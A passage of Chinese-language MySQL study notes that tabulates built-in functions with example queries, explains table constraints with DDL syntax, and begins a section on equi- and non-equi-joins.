| `ASIN(x)  `  | 返回x的反正弦值，即获取正弦为x的值。如果x的值不在-1到1之间，则返回NULL |
| `COS(x)  `   | 返回x的余弦值，其中，参数x为弧度值                           |
| `ACOS(x)  `  | 返回x的反余弦值，即获取余弦为x的值。如果x的值不在-1到1之间，则返回NULL |
| `TAN(x)  `   | 返回x的正切值，其中，参数x为弧度值                           |
| `ATAN(x)  `  | 返回x的反正切值，即返回正切值为x的值                         |
| `ATAN2(m,n)` | 返回两个参数的反正切值                                       |
| `COT(x) `    | 返回x的余切值，其中，X为弧度值                               |

```mysql
SELECT SIN(RADIANS(30)),DEGREES(ASIN(1)),TAN(RADIANS(45)),DEGREES(ATAN(1)),DEGREES(ATAN2(1,1));
```

![image-20220707123537722](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4c3c6faaf104a27b490b0343dde89423-2d49fa0.png)

#### 指数对数函数

| **函数**                 | **用法**                                             |
| ------------------------ | ---------------------------------------------------- |
| `POW(x,y)`，`POWER(X,Y)` | 返回x的y次方                                         |
| `EXP(X)`                 | 返回e的X次方，其中e是一个常数，2.718281828459045     |
| `LN(X)`，`LOG(X)`        | 返回以e为底的X的对数，当X <= 0 时，返回的结果为NULL  |
| `LOG10(X) `              | 返回以10为底的X的对数，当X <= 0 时，返回的结果为NULL |
| `LOG2(X) `               | 返回以2为底的X的对数，当X <= 0 时，返回NULL          |

```mysql
SELECT POW(2,5),POWER(2,4),EXP(2),LN(10),LOG10(10),LOG2(4);
```

![image-20220707123757518](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f2de7e76b39e7fd6e3fc41c57305c31e-7ae0da0.png)

#### 进制转换函数

| **函数**        | **用法**                 |
| --------------- | ------------------------ |
| `BIN(x)`        | 返回x的二进制编码        |
| `HEX(x)`        | 返回x的十六进制编码      |
| `OCT(x)`        | 返回x的八进制编码        |
| `CONV(x,f1,f2)` | 返回f1进制数变成f2进制数 |

```mysql
SELECT BIN(10),HEX(10),OCT(10),CONV(10,2,8)
```

![image-20220707123940222](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/6826fc71dcfa36f03f7a72dda820e6f6-9916815.png)

### 字符串函数

| **函数**                          | **用法**                                                     |
| --------------------------------- | ------------------------------------------------------------ |
| `ASCII(S)`                        | 返回字符串S中的第一个字符的ASCII码值                         |
| `CHAR_LENGTH(s)`                  | 返回字符串s的字符数。作用与`CHARACTER_LENGTH(s)`相同         |
| `LENGTH(s)`                       | 返回字符串s的字节数，和字符集有关                            |
| `CONCAT(s1,s2,......,sn)`         | 连接s1,s2,......,sn为一个字符串                              |
| `CONCAT_WS(x, s1,s2,......,sn)` | 同CONCAT(s1,s2,...)函数，但是每个字符串之间要加上x           |
| `INSERT(str, idx, len,replacestr)` | 将字符串str从第idx位置开始，len个字符长的子串替换为字符串replacestr |
| `REPLACE(str, a, b)`              | 用字符串b替换字符串str中所有出现的字符串a                    |
| `UPPER(s)` 或 `UCASE(s)`          | 将字符串s的所有字母转成大写字母                              |
| `LOWER(s) `或`LCASE(s)`           | 将字符串s的所有字母转成小写字母                              |
| `LEFT(str,n)`                     | 返回字符串str左边的n个字符                                   |
| `RIGHT(str,n)`                    | 返回字符串str右边的n个字符                                   |
| `LPAD(str, len, pad)`             | 用字符串pad对str左边进行填充，直到str的长度为len个字符       |
| `RPAD(str ,len, pad)`             | 用字符串pad对str右边进行填充，直到str的长度为len个字符       |
| `LTRIM(s)`                        | 去掉字符串s左侧的空格                                        |
| `RTRIM(s)`                        | 去掉字符串s右侧的空格                                        |
| `TRIM(s)`                         | 去掉字符串s开始与结尾的空格                                  |
| `TRIM(s1 FROM s)`                 | 去掉字符串s开始与结尾的s1                                    |
| `TRIM(LEADING s1  FROM s)`        | 去掉字符串s开始处的s1                                        |
| `TRIM(TRAILING s1  FROM s)`       | 去掉字符串s结尾处的s1                                        |
| `REPEAT(str, n)`                  | 返回str重复n次的结果                                         |
| `SPACE(n)`                        | 返回n个空格                                                  |
| `STRCMP(s1,s2)`                   | 比较字符串s1,s2的ASCII码值的大小                             |
| `SUBSTR(s,index,len)`             | 返回从字符串s的index位置其len个字符，作用与`SUBSTRING(s,n,len)`、  `MID(s,n,len)`相同 |
| `LOCATE(substr,str)`              | 返回字符串substr在字符串str中首次出现的位置，作用于`POSITION(substr  IN str)`、`INSTR(str,substr)`相同。未找到，返回0 |
| `ELT(m,s1,s2,…,sn)`               | 返回指定位置的字符串，如果m=1，则返回s1，如果m=2，则返回s2，如果m=n，则返回sn |
| `FIELD(s,s1,s2,…,sn)`             | 返回字符串s在字符串列表中第一次出现的位置                    |
| `FIND_IN_SET(s1,s2)`  | 返回字符串s1在字符串s2中出现的位置。其中，字符串s2是一个以逗号分隔的字符串 |
| `REVERSE(s)`          | 返回s反转后的字符串                                          |
| `NULLIF(value1,value2)` | 比较两个字符串，如果value1与value2相等，则返回NULL，否则返回 value1 |

> 注意：MySQL中，字符串的位置是从1开始的。

### 日期和时间函数

#### 获取日期、时间

| **函数**                                                     | **用法**                       |
| ------------------------------------------------------------ | ------------------------------ |
| `CURDATE()` ，`CURRENT_DATE()`                               | 返回当前日期，只包含年、月、日 |
| `CURTIME()` ， `CURRENT_TIME() `                             | 返回当前时间，只包含时、分、秒 |
| `NOW()` / `SYSDATE() `/ `CURRENT_TIMESTAMP()` /  <br />`LOCALTIME()` /  `LOCALTIMESTAMP() ` | 返回当前系统日期和时间         |
| `UTC_DATE()`                                                 | 返回UTC（世界标准时间）日期    |
| `UTC_TIME()`                                                 | 返回UTC（世界标准时间）时间    |

```mysql
SELECT CURDATE(),CURTIME(),NOW(),SYSDATE()+0,UTC_DATE(),UTC_DATE()+0,UTC_TIME(),UTC_TIME();
```

![image-20220707125419937](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5eed3199770bf0af80d697ce98df3e95-2976588.png)

#### 日期与时间戳的转换

| **函数**                     | **用法**                               |
| ---------------------------- | -------------------------------------- |
| `UNIX_TIMESTAMP()`           | 以UNIX时间戳的形式返回当前时间。       |
| `UNIX_TIMESTAMP(date) `      | 将时间date以UNIX时间戳的形式返回。     |
| `FROM_UNIXTIME(timestamp)  ` | 将UNIX时间戳的时间转换为普通格式的时间 |

```mysql
SELECT UNIX_TIMESTAMP(), UNIX_TIMESTAMP('2011-11-11 11:11:11'), FROM_UNIXTIME(1576380910);
```

![image-20220707130551116](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2a4a8f23fd36566e626f5dbd967addd4-6ccef1c.png)

#### 获取月份、星期、星期数、天数等函数

| **函数**                                    | **用法**                                          |
| ------------------------------------------- | ------------------------------------------------- |
| `YEAR(date)` / `MONTH(date)` / `DAY(date)`  | 返回具体的日期值                                  |
| `HOUR(time)`/`MINUTE(time)`/ `SECOND(time)` | 返回具体的时间值                                  |
| `MONTHNAME(date)`                           | 返回月份：January，...                            |
| `DAYNAME(date)`                             | 返回星期几：MONDAY，TUESDAY.....SUNDAY            |
| `WEEKDAY(date)`                             | 返回周几，注意，周1是0，周2是1，。。。周日是6     |
| `QUARTER(date)`                             | 返回日期对应的季度，范围为1～4                    |
| `WEEK(date)` ， `WEEKOFYEAR(date)`          | 返回一年中的第几周                                |
| `DAYOFYEAR(date)`                           | 返回日期是一年中的第几天                          |
| `DAYOFMONTH(date)`                          | 返回日期位于所在月份的第几天                      |
| `DAYOFWEEK(date)`                           | 返回周几，注意：周日是1，周一是2，。。。周六是  7 |

```mysql
SELECT 
YEAR(CURDATE()),MONTH(CURDATE()),DAY(CURDATE()),
HOUR(CURTIME()),MINUTE(NOW()),SECOND(SYSDATE());
```

![image-20220707130851404](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4b7b74ccb638f8cbfa0de08db3c01f43-2757fec.png)

```mysql
SELECT MONTHNAME('2021-10-26'),DAYNAME('2021-10-26'),WEEKDAY('2021-10-26'),
QUARTER(CURDATE()),WEEK(CURDATE()),DAYOFYEAR(NOW()),
DAYOFMONTH(NOW()),DAYOFWEEK(NOW());
```

![image-20220707131104475](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5431f8decdd870150d1e335435b6c1c5-2f091ea.png)

#### 日期的操作函数

| **函数**                  | **用法**                                   |
| ------------------------- | ------------------------------------------ |
| `EXTRACT(type FROM date)` | 返回指定日期中特定的部分，type指定返回的值 |

函数中`type`的取值与含义：

![image-20220707131225431](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f27a751254afb237adedbc80578768c9-08aca16.png)

![image-20220707131231606](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4aa7ecb5ef74032876f671b11f8fa2df-7a2949d.png)

```mysql
SELECT NOW(),EXTRACT(MINUTE FROM NOW()),EXTRACT( WEEK FROM NOW()),
EXTRACT( QUARTER FROM NOW()),EXTRACT( MINUTE_SECOND FROM NOW());
```

![image-20220707131353893](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/39ef9b6c3aaff0fe81add12a5e380a10-8c357b4.png)

#### 时间和秒钟转换的函数

| **函数**               | **用法**                                                     |
| ---------------------- | ------------------------------------------------------------ |
| `TIME_TO_SEC(time)`    | 将 time 转化为秒并返回结果值。转化的公式为：小时x3600+分钟x60+秒 |
| `SEC_TO_TIME(seconds)` | 将 seconds 描述转化为包含小时、分钟和秒的时间                |

```mysql
SELECT TIME_TO_SEC('05:16:42'), SEC_TO_TIME('19002');
```

![image-20220707131824120](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2676c9b6eb72c184990c8e03a03ea6f1-bfb6159.png)

#### 计算日期和时间的函数

- **date类型**

    | **函数**                                                     | **用法**                                       |
    | ------------------------------------------------------------ | ---------------------------------------------- |
    | `DATE_ADD(datetime, INTERVAL expr  type)`，`ADDDATE(date,INTERVAL expr type)` | 返回与给定日期时间相差INTERVAL时间段的日期时间 |
    | `DATE_SUB(date,INTERVAL expr type)`，  `SUBDATE(date,INTERVAL expr type) ` | 返回与date相差INTERVAL时间间隔的日期           |

    `type`的取值：

    ![image-20220707133114760](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2ac627268b214c85dbe26d13f1f1debf-e7b59b0.png)

    ```mysql
    SELECT 
    DATE_ADD(NOW(), INTERVAL 1 DAY) AS col1,
    DATE_ADD('2021-10-21 23:32:12',INTERVAL 1 SECOND) AS col2,
    ADDDATE('2021-10-21 23:32:12',INTERVAL 1 SECOND) AS col3,
    DATE_ADD('2021-10-21 23:32:12',INTERVAL '1_1' MINUTE_SECOND) AS col4,
    DATE_ADD(NOW(), INTERVAL -1 YEAR) AS col5, #可以是负数
    DATE_ADD(NOW(), INTERVAL '1_1' YEAR_MONTH) AS col6 #需要单引号
    ```

    ![image-20220707133309139](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8826d8585990d50d863b4c21d91b0829-18acb61.png)

    ```mysql
    SELECT 
    DATE_SUB('2021-01-21',INTERVAL 31 DAY) AS col1,
    SUBDATE('2021-01-21',INTERVAL 31 DAY) AS col2,
    DATE_SUB('2021-01-21 02:01:01',INTERVAL '1 1' DAY_HOUR) AS col3
    ```

    ![image-20220707133349081](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/97adfc0b78a3e2fb30f84839e4e07bd7-3a498c6.png)
    
- **time类型**

    | **函数**                       | **用法**                                                     |
    | ------------------------------ | ------------------------------------------------------------ |
    | `ADDTIME(time1,time2)`         | 返回time1加上time2的时间。当time2为一个数字时，代表的是秒，可以为负数 |
    | `SUBTIME(time1,time2)`         | 返回time1减去time2后的时间。当time2为一个数字时，代表的是秒，可以为负数 |
    | `DATEDIFF(date1,date2)`        | 返回date1 - date2的日期间隔天数                              |
    | `TIMEDIFF(time1, time2)`       | 返回time1 - time2的时间间隔                                  |
    | `FROM_DAYS(N)`                 | 返回从0000年1月1日起，N天以后的日期                          |
    | `TO_DAYS(date) `               | 返回日期date距离0000年1月1日的天数                           |
    | `LAST_DAY(date)`               | 返回date所在月份的最后一天的日期                             |
    | `MAKEDATE(year,n) `            | 针对给定年份与所在年份中的天数返回一个日期                   |
    | `MAKETIME(hour,minute,second)` | 将给定的小时、分钟和秒组合成时间并返回                       |
    | `PERIOD_ADD(time,n`)           | 返回time加上n后的时间                                        |

    ```mysql
    SELECT
    NOW(),					# 2022-07-07 05:41:32
    ADDTIME(NOW(),20),		# 2022-07-07 05:41:52
    SUBTIME(NOW(),30),		# 2022-07-07 05:41:02
    SUBTIME(NOW(),'1:1:3'),	# 2022-07-07 04:40:29
    DATEDIFF(NOW(),'2022-5-01'),	# 67
    TIMEDIFF(NOW(),'2022-5-25 22:10:10'),	# 838:59:59
    FROM_DAYS(366),			# 0001-01-01
    TO_DAYS('0000-12-25'),	# 359
    LAST_DAY(NOW()),		# 2022-07-31
    MAKEDATE(YEAR(NOW()),12),		# 2022-01-12
    MAKETIME(10,21,23),		# 10:21:23
    PERIOD_ADD(20200101010101, 10)	# 13754718911
    ```

#### 日期的格式化与解析

| **函数**                            | **用法**                                   |
| ----------------------------------- | ------------------------------------------ |
| `DATE_FORMAT(date,fmt)`             | 按照字符串fmt格式化日期date值              |
| `TIME_FORMAT(time,fmt)`             | 按照字符串fmt格式化时间time值              |
| `GET_FORMAT(date_type,format_type)` | 返回日期字符串的显示格式                   |
| `STR_TO_DATE(str, fmt) `            | 按照字符串fmt对str进行解析，解析为一个日期 |

- fmt参数常用的格式符：

    | **格式符** | **说明**                                                     | **格式符**    | **说明**                                                     |
    | ---------- | ------------------------------------------------------------ | ------------- | ------------------------------------------------------------ |
    | `%Y`       | 4位数字表示年份                                              | `%y`          | 表示两位数字表示年份                                         |
    | `%M  `     | 月名表示月份（January,....）                                 | `%m`          | 两位数字表示月份  （01,02,03。。。）                         |
    | `%b  `     | 缩写的月名（Jan.，Feb.，....）                               | `%c  `        | 数字表示月份（1,2,3,...）                                    |
    | `%D`       | 英文后缀表示月中的天数  （1st,2nd,3rd,...）                  | `%d`          | 两位数字表示月中的天数(01,02...)                             |
    | `%e  `     | 数字形式表示月中的天数  （1,2,3,4,5.....）                   |               |                                                              |
    | `%H  `     | 两位数字表示小数，24小时制  （01,02..）                      | `%h` 和`%I`   | 两位数字表示小时，12小时制  （01,02..）                      |
    | `%k`       | 数字形式的小时，24小时制(1,2,3)                              | `%l`          | 数字形式表示小时，12小时制  （1,2,3,4....）                  |
    | `%i `      | 两位数字表示分钟（00,01,02）                                 | `%S` 和`%s  ` | 两位数字表示秒(00,01,02...)                                  |
    | `%W`       | 一周中的星期名称（Sunday...）                                | `%a`          | 一周中的星期缩写（Sun.，  Mon.,Tues.，..）                   |
    | `%w  `     | 以数字表示周中的天数  (0=Sunday,1=Monday....)                |               |                                                              |
    | `%j`       | 以3位数字表示年中的天数(001,002...)                          | `%U  `        | 以数字表示年中的第几周，  （1,2,3。。）其中Sunday为周中第一天 |
    | `%u  `     | 以数字表示年中的第几周，  （1,2,3。。）其中Monday为周中第一天 |               |                                                              |
    | `%T`       | 24小时制                                                     | `%r`          | 12小时制                                                     |
    | `%p`       | AM或PM                                                       | `%%`          | 表示%                                                        |

- GET_FORMAT函数中date_type和format_type参数取值如下：

    ![image-20220707135101922](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dbc51b202250a992a589b3437074dc3b-315443f.png)

```mysql
SELECT 
NOW(),
DATE_FORMAT(NOW(), '%H:%i:%s'), 
STR_TO_DATE('2014-04-22 15:47:06','%Y-%m-%d %H:%i:%s'),
GET_FORMAT(DATE, 'USA');
```

![image-20220707135301222](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/456ebd13bfc0800684cf2dc37ee6034d-4a6f291.png)

### 流程控制函数

流程处理函数可以根据不同的条件，执行不同的处理流程，可以在SQL语句中实现不同的条件选择。

| **函数**                                                     | **用法**                                        |
| ------------------------------------------------------------ | ----------------------------------------------- |
| `IF(value,value1,value2)`                                    | 如果value的值为TRUE，返回value1，否则返回value2 |
| `IFNULL(value1, value2)`                                     | 如果value1不为NULL，返回value1，否则返回value2  |
| `CASE WHEN 条件1 THEN 结果1 WHEN 条件2 THEN 结果2  .... [ELSE resultn] END` | 相当于if...else if...else...                    |
| `CASE expr WHEN 常量值1 THEN 值1 WHEN 常量值1 THEN 值1 .... [ELSE 值n] END` | 相当于switch...case...                          |

### 加密与解密函数

加密与解密函数主要用于对数据库中的数据进行加密和解密处理，以防止数据被他人窃取。这些函数在保证数据库安全时非常有用。

| **函数**                      | **用法**                                                     |
| ----------------------------- | ------------------------------------------------------------ |
| `PASSWORD(str)`               | 返回字符串str的加密版本，41位长的字符串。加密结果不可逆，常用于用户的密码加密 |
| `MD5(str)`                    | 返回字符串str的md5加密后的值，也是一种加密方式。若参数为  NULL，则会返回NULL |
| `SHA(str)`                    | 从原明文密码str计算并返回加密后的密码字符串，当参数为 NULL时，返回NULL。SHA加密算法比MD5更加安全。 |
| `ENCODE(value,password_seed)` | 返回使用password_seed作为加密密码加密value                   |
| `DECODE(value,password_seed)` | 返回使用password_seed作为加密密码解密value                   |

```mysql
 SELECT 
 PASSWORD('mysql'), PASSWORD(NULL), 
 md5('123'), SHA('123'), 
 ENCODE('mysql', 'mysql'), DECODE(ENCODE('mysql','mysql'),'mysql')
```

![image-20220707135922748](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2bdd5ec64f9c13ffaf7341cafe14574b-12192ff.png)

### MySQL信息函数

MySQL中内置了一些可以查询MySQL信息的函数，这些函数主要用于帮助数据库开发或运维人员更好地对数据库进行维护工作。

| **函数**                                                     | **用法**                                                   |
| ------------------------------------------------------------ | ---------------------------------------------------------- |
| `VERSION()`                                                  | 返回当前MySQL的版本号                                      |
| `CONNECTION_ID()`                                            | 返回当前MySQL服务器的连接数                                |
| `DATABASE()`，`SCHEMA()`                                     | 返回MySQL命令行当前所在的数据库                            |
| `USER()`，`CURRENT_USER()`、<br />`SYSTEM_USER()`，`SESSION_USER()` | 返回当前连接MySQL的用户名，返回结果格式为  “主机名@用户名” |
| `CHARSET(value)`                                             | 返回字符串value自变量的字符集                              |
| `COLLATION(value)`                                           | 返回字符串value的比较规则                                  |

```mysql
SELECT DATABASE(),SCHEMA(),VERSION(),CONNECTION_ID(), USER(), CURRENT_USER(), SYSTEM_USER(),SESSION_USER(),CHARSET('ABC'),COLLATION('ABC')
```

![image-20220707140254594](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/58542c5e20c48f14bfac27dd34926c7c-26e92eb.png)

### 其他函数

MySQL中有些函数无法对其进行具体的分类，但是这些函数在MySQL的开发和运维过程中也是不容忽视的。

| **函数**                         | **用法**                                                     |
| -------------------------------- | ------------------------------------------------------------ |
| `FORMAT(value,n) `               | 返回对数字value进行格式化后的结果数据。n表示四舍五入后保留到小数点后n位 |
| `CONV(value,from,to) `           | 将value的值进行不同进制之间的转换                            |
| `INET_ATON(ipvalue)`             | 将以点分隔的IP地址转化为一个数字                             |
| `INET_NTOA(value)`               | 将数字形式的IP地址转化为以点分隔的IP地址                     |
| `BENCHMARK(n,expr)`              | 将表达式expr重复执行n次。用于测试MySQL处理expr表达式所耗费的时间 |
| `CONVERT(value USING char_code)` | 将value所使用的字符编码修改为char_code                       |

```mysql
SELECT INET_ATON('192.168.1.100'), INET_NTOA(3232235876), BENCHMARK(1000000, MD5('mysql'))
```

![image-20220707140632895](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ffd2f0fdd076e15166feb900c1237dbd-bce4fff.png)

## 约束

### 概述

约束是表级的强制规定。可以在创建表时规定约束（通过 CREATE TABLE 语句），或者在表创建之后通过 ALTER TABLE 语句规定约束。

**概念**：约束是作用于表中字段上的规则，用于限制存储在表中的数据。

**目的**：保证数据库中数据的正确、有效性和完整性。

**分类**:

| 约束                   | 描述                                                     | 关键字       |
| ---------------------- | -------------------------------------------------------- | ------------ |
| 非空约束               | 限制该字段的数据不能为null                               | NOT  NULL    |
| 唯一约束               | 保证该字段的所有数据都是唯一、不重复的                   | UNIQUE       |
| 主键约束               | 主键是一行数据的唯一标识，要求非空且唯一                 | PRIMARY  KEY |
| 默认约束               | 保存数据时，如果未指定该字段的值，则采用默认值           | DEFAULT      |
| 检查约束(8.0.16版本后) | 保证字段值满足某一个条件                                 | CHECK        |
| 外键约束               | 用来让两张表的数据之间建立连接，保证数据的一致性和完整性 | FOREIGN KEY  |

> 注意：约束是作用于表中字段上的，可以在创建表/修改表的时候添加约束。

#### 非空约束

`NOT NULL` , 限定某个字段/某列的值不允许为空

```
特点
- 默认，所有的类型的值都可以是NULL，包括INT、FLOAT等数据类型
- 非空约束只能出现在表对象的列上，只能某个列单独限定非空，不能组合非空
- 一个表可以有很多列都分别限定了非空
- 空字符串''不等于NULL，0也不等于NULL
```

```mysql
-- 建表添加非空约束
CREATE TABLE 表名称(
 ...
 字段名 数据类型 NOT NULL, 
 ...
);
-- 添加非空约束
alter table 表名称 modify 字段名 数据类型 not null;
-- 删除非空约束
alter table 表名称 modify 字段名 数据类型 NULL;#去掉not null，相当于修改字段，该字段允许为空
alter table 表名称 modify 字段名 数据类型;#去掉not null，相当于修改某个非注解字段，该字段允许为空
```

#### 唯一性约束

`UNIQUE` , 用来限制某个字段/某列的值不能重复

```
特点
- 同一个表可以有多个唯一约束。
- 唯一约束可以是某一个列的值唯一，也可以多个列组合的值唯一。
- 唯一性约束允许列值为空。
- 在创建唯一约束的时候，如果不给唯一约束命名，就默认和列名相同。
- MySQL会给唯一约束的列上默认创建一个唯一索引。
```

```mysql
-- 建表时添加唯一约束
create table 表名称(
 ...
 字段名 数据类型  unique, 
 字段名 数据类型  unique key,
 ...
);
create table 表名称(
 ...
 字段名 数据类型, 
 ... 
 [constraint 约束名] unique(字段名)
);

-- 添加唯一约束
-- 字段列表中如果是一个字段，表示该列的值唯一。如果是两个或更多个字段，那么复合唯一，即多个字段的组合是唯一的
alter table 表名称 add unique key(字段列表);	# 表级约束
alter table 表名称 modify 字段名 字段类型 unique;  # 行级约束

-- 删除唯一约束
-- 删除唯一约束只能通过删除唯一索引的方式删除。
SELECT * FROM information_schema.table_constraints WHERE table_name = '表名'; #查看都有哪些约束
ALTER TABLE 表名称 DROP INDEX 唯一索引名;
```

> 注意：可以通过  `show index from 表名称;` 查看表的索引

#### 主键约束

`PRIMARY KEY`, 用来唯一标识表中的一行记录。

```
特点:
- 主键约束相当于唯一约束+非空约束的组合，主键约束列不允许重复，也不允许出现空值。
- 一个表最多只能有一个主键约束，建立主键约束可以在列级别创建，也可以在表级别上创建。
- 主键约束对应着表中的一列或者多列（复合主键）
- 如果是多列组合的复合主键约束，那么这些列都不允许为空值，并且组合的值不允许重复。
- MySQL的主键名总是PRIMARY，就算自己命名了主键约束名也没用。
- 当创建主键约束时，系统默认会在所在的列或列组合上建立对应的主键索引（能够根据主键查询的，就根据主键查询，效率更高）。如果删除主键约束了，主键约束对应的索引就自动删除了。
- 需要注意的一点是，不要修改主键字段的值。因为主键是数据记录的唯一标识，如果修改了主键的值，就有可能会破坏数据的完整性。
```

```mysql
-- 建表时指定主键约束
create table 表名称(
 字段名 数据类型  primary key, #列级模式
 字段名 数据类型, 
 字段名 数据类型 
);
create table 表名称(
 字段名 数据类型,
 字段名 数据类型, 
 字段名 数据类型,
 [constraint 约束名] primary key(字段名) #表级模式
);

-- 建表后增加主键约束
ALTER TABLE 表名称 ADD PRIMARY KEY(字段列表); #字段列表可以是一个字段，也可以是多个字段，如果是多个字段的话，是复合主键

-- 删除主键约束
-- 说明：删除主键约束，不需要指定主键名，因为一个表只有一个主键，删除主键约束后，非空还存在。
alter table 表名称 drop primary key;
```

#### 自增列

`AUTO_INCREMENT` , 某个字段的值自增

```
特点:
- 一个表最多只能有一个自增长列
- 当需要产生唯一标识符或顺序值时，可设置自增长
- 自增长列约束的列必须是键列（主键列，唯一键列）
- 自增约束的列的数据类型必须是整数类型
- 如果自增列指定了 0 和 null，会在当前最大值的基础上自增；如果自增列手动指定了具体值，直接赋值为具体值。
```

```mysql
-- 建表时指定自增约束
create table 表名称(
 字段名 数据类型  primary key auto_increment,
 字段名 数据类型,
 字段名 数据类型,
);
create table 表名称(
 字段名 数据类型,
 字段名 数据类型 unique key auto_increment, 
 字段名 数据类型,
);

-- 建表后增加自增约束
alter table 表名称 modify 字段名 数据类型 auto_increment;

-- 删除自增约束
alter table 表名称 modify 字段名 数据类型;  	#去掉auto_increment相当于删除
```

#### 外键约束

`FOREIGN KEY`, 用来让两张表的数据之间建立连接，从而保证数据的一致性和完整性。

**主表和从表/父表和子表**:

- 主表（父表）：被引用的表，被参考的表
- 从表（子表）：引用别人的表，参考别人的表

例如：员工表的员工所在部门这个字段的值要参考部门表：部门表是主表，员工表是从表。
例如：学生表、课程表、选课表：选课表的学生和课程要分别参考学生表和课程表，学生表和课程表是
主表，选课表是从表。

```
特点:
- 从表的外键列，必须引用/参考主表的主键或唯一约束的列
	为什么？因为被依赖/被参考的值必须是唯一的
- 在创建外键约束时，如果不给外键约束命名，默认名不是列名，而是自动产生一个外键名（例如student_ibfk_1），也可以指定外键约束名。
- 创建(CREATE)表时就指定外键约束的话，先创建主表，再创建从表
- 删表时，先删从表（或先删除外键约束），再删除主表
- 当主表的记录被从表参照时，主表的记录将不允许删除，如果要删除数据，需要先删除从表中依赖该记录的数据，然后才可以删除主表的数据
- 在“从表”中指定外键约束，并且一个表可以建立多个外键约束
- 从表的外键列与主表被参照的列名字可以不相同，但是数据类型必须一样，逻辑意义一致。如果类型不一样，创建子表时，就会出现错误“ERROR 1005 (HY000): Can't create table'database.tablename'(errno: 150)”。
	例如：都是表示部门编号，都是int类型。
- 当创建外键约束时，系统默认会在所在的列上建立对应的普通索引。但是索引名是外键的约束名。（根据外键查询效率很高）
- 删除外键约束后，必须手动删除对应的索引
```

```mysql
-- 建表时指定外键约束
create table 主表名称(
 字段1 数据类型  primary key,
 字段2 数据类型
);
create table 从表名称(
 字段1 数据类型,
 字段2 数据类型,
 [CONSTRAINT <外键约束名称>] FOREIGN KEY（从表的某个字段) references 主表名(被参考字段)
);

-- 建表后增加外键约束
ALTER TABLE 从表名 ADD [CONSTRAINT 约束名] FOREIGN KEY (从表的字段) REFERENCES 主表名(被引用字段) [on update xx][on delete xx];

-- 删除外键约束(必须手动删除对应的索引)
SELECT * FROM information_schema.table_constraints WHERE table_name = '表名称';#查看某个表的约束名
ALTER TABLE 从表名 DROP FOREIGN KEY 外键约束名;	# 删除外键约束
SHOW INDEX FROM 表名称; #查看某个表的索引名
ALTER TABLE 从表名 DROP INDEX 索引名;	# 删除外键约束对应索引
```

**总结**：约束关系是针对双方的

- 添加了外键约束后，主表的修改和删除数据受约束
- 添加了外键约束后，从表的添加和修改数据受约束
- 在从表上建立外键，要求主表必须存在
- 删除主表时，要求从表从表先删除，或将从表中外键引用该主表的关系先删除 

#### 外键约束等级

添加外键约束时, 提供可选参数 `[on update 约束等级][on delete 约束等级];`, 约束等级有以下几种:

- **Cascade**方式 ：

  在父表上update/delete记录时，同步update/delete掉子表的匹配记录

- **Set null**方式 ：

  在父表上update/delete记录时，将子表上匹配记录的列设为null，但是要注意子表的外键列不能为not null

- **No action**方式 ：

  如果子表中有匹配的记录，则不允许对父表对应候选键进行update/delete操作

- **Restrict**方式 ：

  同no action， 都是立即检查外键约束

- **Set default**方式 : 

  父表有变更时，子表将外键列设置成一个默认的值，但Innodb不能识别 

> 如果没有指定等级，就相当于Restrict方式。

```mysql
create table dept(
 did int primary key, 	#部门编号
 dname varchar(50) 		#部门名称
);
create table emp(
 eid int primary key,  	#员工编号
 ename varchar(5),   	#员工姓名
 deptid int, 			#员工所在的部门
 foreign key (deptid) references dept(did)  on update cascade on delete set null
 #把修改操作设置为级联修改等级，把删除操作设置为set null等级
);
```

#### 默认值约束

`DEFAULT` , 给某个字段/某列指定默认值，一旦设置默认值，在插入数据时，如果此字段没有显式赋值，则赋值为默认值。

```mysql
-- 建表时给字段加默认值
create table 表名称(
 字段名 数据类型  not null default 默认值,
);
# 说明：默认值约束一般不在唯一键和主键列上加

-- 建表后给字段加默认值
alter table 表名称 modify 字段名 数据类型 default 默认值;

-- 删除默认值约束
alter table 表名称 modify 字段名 数据类型 ;			#删除默认值约束，也不保留非空约束
alter table 表名称 modify 字段名 数据类型  not null; 	#删除默认值约束，保留非空约束
```

### 约束使用

```
案例需求： 根据需求，完成表结构的创建。需求如下
字段名		字段含义	字段类型			约束条件			约束关键字
id		ID唯一标识		int			主键，并且自动增长		  PRIMARY KEY,AUTO_INCREMENT
name	姓名			varchar(10)	  不为空，并且唯一			NOT NULL , UNIQUE
age		年龄			int	
status	状态			char(1)		  如果没有指定该值，默认为1	 DEFAULT
gender	性别			char(1)		        
```

```mysql
-- 建表语句
CREATE TABLE tb_user(
	id int AUTO_INCREMENT PRIMARY KEY COMMENT 'ID唯一标识',
	name varchar(10) NOT NULL UNIQUE COMMENT '姓名' ,
	age int  COMMENT '年龄' ,
	status char(1) default '1' COMMENT '状态',
	gender char(1) COMMENT '性别'
);
```

查看某个表已有的约束:

```mysql
SELECT * FROM information_schema.table_constraints WHERE table_name = '表名称';
```

![image-20220707180448064](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/06eeda1896341f336de56c9d2d479af3-59d544a.png)



## 多表查询

### 等值连接/非等值连接

- **等值连接**

  关联条件为相等关系的多表查询

  ```mysql
  -- 查询员工信息及部门信息
  SELECT emp.employee_id,dept.department_name,emp.department_id
  FROM employees emp,departments dept
  WHERE emp.`department_id` = dept.department_id;
  ```

- **非等值连接**

  关联条件为其他关系的多表查询

  ```mysql
  -- 查询员工的工资等级
  SELECT e.last_name,e.salary,j.grade_level
  FROM employees e,job_grades j
